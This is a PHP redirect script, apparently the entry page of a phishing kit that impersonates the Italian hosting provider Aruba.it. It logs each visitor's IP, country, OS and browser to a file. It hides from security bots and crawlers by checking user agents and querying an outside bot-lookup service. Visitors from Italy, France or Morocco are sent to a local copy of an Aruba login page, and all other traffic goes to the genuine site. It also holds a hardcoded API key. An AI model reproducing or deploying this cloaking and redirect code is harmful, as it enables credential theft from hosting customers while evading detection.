<?php
error_reporting(0);
include 'inc/app.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser(); 
$file = fopen("visit.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

function IP_TO_EARTH($ip){
	$_URL="https://iptoearth.expeditedaddons.com/?api_key=ECKW4U278N4YQLMZTG703P91BS9R52H068IOXJ5D6FA3V1&ip=$ip"; 
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
	curl_setopt($ch, CURLOPT_URL, $_URL);
	$content = curl_exec($ch);
	$response=json_decode($content, true);
	return $response;
	curl_close($ch);
	}
function visitorip() {if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];}else if (getenv('HTTP_CLIENT_IP')){$ip = getenv('HTTP_CLIENT_IP');}else if(getenv('HTTP_X_FORWARDED_FOR')) {$ip = getenv('HTTP_X_FORWARDED_FOR');}else if(getenv('HTTP_X_FORWARDED')) {$ip = getenv('HTTP_X_FORWARDED');}else if(getenv('HTTP_FORWARDED_FOR')) {$ip = getenv('HTTP_FORWARDED_FOR');}else if(getenv('HTTP_FORWARDED')) {$ip = getenv('HTTP_FORWARDED');}else if(getenv('REMOTE_ADDR')) {$ip = getenv('REMOTE_ADDR');}else {$ip = $_SERVER['HTTP_HOST'];}$ip=explode(",",$ip);return $ip[0];}
function IS_BOT_CRAWLER() {
	return (isset($_SERVER['HTTP_USER_AGENT'])&& preg_match('/bot|crawl|crawler|proxy|slurp|spider/i', $_SERVER['HTTP_USER_AGENT']));
	}
function IS_BOT($ip){
	$url="http://bot.myip.ms/$ip";
	$agent="Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	$res = curl_exec($ch);
	curl_close($ch);
	if (strpos($res, 'Bot on this IP address') == true) {
		return true;
		}else{
			return false;
			}
	}
$ip=visitorip();
$hostname = gethostbyaddr($ip);
$response=IP_TO_EARTH($ip);
if(!IS_BOT_CRAWLER() && !IS_BOT($ip) && ($response["country_code"] == "IT" || $response["country_code"] == "FR"|| $response["country_code"] == "MA")){
	echo '
	
 <script>
            window.location="ar06/Servizio Hosting - Aruba.it.php";
            </script>

	
	';
}else{
echo '
	<script>
		window.location="https://href.li/?https://managehosting.aruba.it/areautenti.asp";
	</script>
';
}
?>